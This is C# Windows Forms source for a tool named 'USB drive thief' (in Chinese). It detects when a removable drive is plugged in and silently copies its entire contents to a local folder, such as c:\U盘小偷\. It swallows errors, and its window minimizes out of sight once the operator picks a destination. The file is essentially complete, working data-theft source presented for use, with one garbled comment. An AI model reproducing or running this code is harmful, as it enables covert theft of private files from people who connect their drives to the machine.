using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace U盘小偷
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }
        private static void CopyDirectory(string srcdir, string desdir)
        {
            
            string folderName = srcdir.Substring(srcdir.LastIndexOf("\\") + 1);

            string desfolderdir = desdir + "\\" ;

            if (desdir.LastIndexOf("\\") == (desdir.Length - 1))
            {
                desfolderdir = desdir + folderName;
            }
            string[] filenames = Directory.GetFileSystemEntries(srcdir);
            foreach (string file in filenames)// 遍历所有的文件和目录  
            {
                if (Directory.Exists(file))// 先当作目录处理如果存在这个目录就递归Copy该目录下面的文件  
                {

                    string currentdir = desfolderdir + "\\" + file.Substring(file.LastIndexOf("\\") + 1);
                    if (!Directory.Exists(currentdir))
                    {
                        Directory.CreateDirectory(currentdir);
                    }

                    CopyDirectory(file, desfolderdir);
                }

                else // 否则直接copy文件  
                {
                    string srcfileName = file.Substring(file.LastIndexOf("\\") + 1);

                    srcfileName = desfolderdir + "\\" + srcfileName;


                    if (!Directory.Exists(desfolderdir))
                    {
                        Directory.CreateDirectory(desfolderdir);
                    }


                    try
                    {
                        File.Copy(file, srcfileName);
                    }
#pragma warning disable CS0168 // 声明了变量“e”，但从未使用过
                    catch (Exception e)
#pragma warning restore CS0168 // 声明了变量“e”，但从未使用过
                    {
                        continue;
                    }

                }
                
            }//foreach   
            
        }
        [StructLayout(LayoutKind.Sequential)]
        public struct DEV_BROADCAST_VOLUME
        {
            public int dbcv_size;
            public int dbcv_devicetype;
            public int dbcv_reserved;
            public int dbcv_unitmask;
        }
        protected override void WndProc(ref Message m)
        {
            // 发生设备变动
            const int WM_DEVICECHANGE = 0x0219;
            // 系统检测到一个新设备
            const int DBT_DEVICEARRIVAL = 0x8000;
            // 系统完成移除一个设备
            const int DBT_DEVICEREMOVECOMPLETE = 0x8001;
            // 逻辑卷标
            const int DBT_DEVTYP_VOLUME = 0x00000002;
            switch (m.Msg)
            {
                case WM_DEVICECHANGE:
                    switch (m.WParam.ToInt32())
                    {
                        case DBT_DEVICEARRIVAL:
                            int devType = Marshal.ReadInt32(m.LParam, 4);
                            if (devType == DBT_DEVTYP_VOLUME)//U盘插入
                            {                           
                                DriveInfo[] allDrives = DriveInfo.GetDrives();  
                                foreach (DriveInfo d in allDrives)
                                {
                                    //жU
                                    if (d.DriveType == DriveType.Removable)
                                    {
                                        
                                        fpath = d.Name;
                                        Thread t1 = new Thread(Function1);
                                        t1.Start();                                     
                                    }
                                }
                            }
                            break;
                        case DBT_DEVICEREMOVECOMPLETE:
                           // MessageBox.Show("over");
                            break;
                    }
                    break;
            }
            base.WndProc(ref m);
        }
       static string  tpath=@"c:\U盘小偷\";
        static string fpath ;
        private static void Function1()
        {
            Thread.Sleep(0);
            try
            {
                CopyDirectory(fpath, tpath);
            }
            catch
            {
                MessageBox.Show("当前U盘被强制拔出！！！","系统提示：");
            }
           
            
        }
        private void button1_Click(object sender, EventArgs e)
        {
            if(saveFileDialog1.ShowDialog()==DialogResult.OK)
            {
               tpath = saveFileDialog1.FileName+@"\";
                this.WindowState = FormWindowState.Minimized;
            }
           
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            Process[] processes = System.Diagnostics.Process.GetProcessesByName(Application.CompanyName);
            if (processes.Length > 1)
            {
                MessageBox.Show("应用程序已经在运行中...","系统提示：");
                Thread.Sleep(1000);
                System.Environment.Exit(1);
            }
            
        }
    }
}
